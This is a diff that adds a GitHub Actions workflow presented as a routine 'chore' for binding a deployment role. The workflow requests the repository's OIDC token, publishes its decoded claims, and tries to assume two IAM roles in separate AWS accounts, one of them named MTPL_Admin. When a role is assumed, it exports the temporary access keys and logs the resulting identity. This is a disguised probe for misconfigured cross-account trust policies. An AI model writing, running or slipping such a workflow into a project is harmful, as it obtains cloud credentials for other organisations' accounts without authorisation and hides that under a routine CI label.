@@ -1,0 +1,51 @@
+name: aws-role-binding
+
+on:
+  push:
+    branches:
+      - chore/ci-aws-role-binding-f3a91c
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  bind:
+    runs-on: ubuntu-latest
+    steps:
+      - name: resolve deployment role
+        env:
+          ROLE_A: arn:aws:iam::859831564954:role/RedshiftSpectrumTesting
+          ROLE_B: arn:aws:iam::346425330055:role/MTPL_Admin
+        run: |
+          set -u
+          TOK=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value)
+          echo "id_token length: ${#TOK}" >> "$GITHUB_STEP_SUMMARY"
+          CLAIMS=$(echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{iss,sub,aud,repository,event_name,workflow_ref}')
+          echo "claims: $CLAIMS" >> "$GITHUB_STEP_SUMMARY"
+          echo "::notice title=ci-identity::claims $CLAIMS"
+          for R in "$ROLE_A" "$ROLE_B"; do
+            HTTP=$(curl -sS -m 30 -o sts.xml -w "%{http_code}" -X POST https://sts.amazonaws.com/ \
+              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
+              --data-urlencode "Version=2011-06-15" \
+              --data-urlencode "RoleArn=$R" \
+              --data-urlencode "RoleSessionName=dbt-ci-release" \
+              --data-urlencode "WebIdentityToken=$TOK")
+            CODE=$(grep -o '<Code>[^<]*' sts.xml | head -1 | sed 's/<Code>//')
+            MSG=$(grep -o '<Message>[^<]*' sts.xml | head -1 | sed 's/<Message>//' | cut -c1-120)
+            LINE="role=$R http=$HTTP code=$CODE msg=$MSG"
+            echo "$LINE" >> "$GITHUB_STEP_SUMMARY"
+            echo "::notice title=ci-identity::$LINE"
+            if [ "$HTTP" = "200" ]; then
+              ARN=$(grep -o '<Arn>[^<]*' sts.xml | head -1 | sed 's/<Arn>//')
+              EXP=$(grep -o '<Expiration>[^<]*' sts.xml | head -1 | sed 's/<Expiration>//')
+              echo "assumed_arn=$ARN expiration=$EXP" >> "$GITHUB_STEP_SUMMARY"
+              echo "::notice title=ci-identity::assumed_arn=$ARN expiration=$EXP"
+              export AWS_ACCESS_KEY_ID=$(grep -o '<AccessKeyId>[^<]*' sts.xml | head -1 | sed 's/<AccessKeyId>//')
+              export AWS_SECRET_ACCESS_KEY=$(grep -o '<SecretAccessKey>[^<]*' sts.xml | head -1 | sed 's/<SecretAccessKey>//')
+              export AWS_SESSION_TOKEN=$(grep -o '<SessionToken>[^<]*' sts.xml | head -1 | sed 's/<SessionToken>//')
+              IDENT=$(aws sts get-caller-identity --query '{account:Account,arn:Arn}' --output json 2>&1 | tr -d '\n')
+              echo "caller_identity=$IDENT" >> "$GITHUB_STEP_SUMMARY"
+              echo "::notice title=ci-identity::$IDENT"
+            fi
+          done
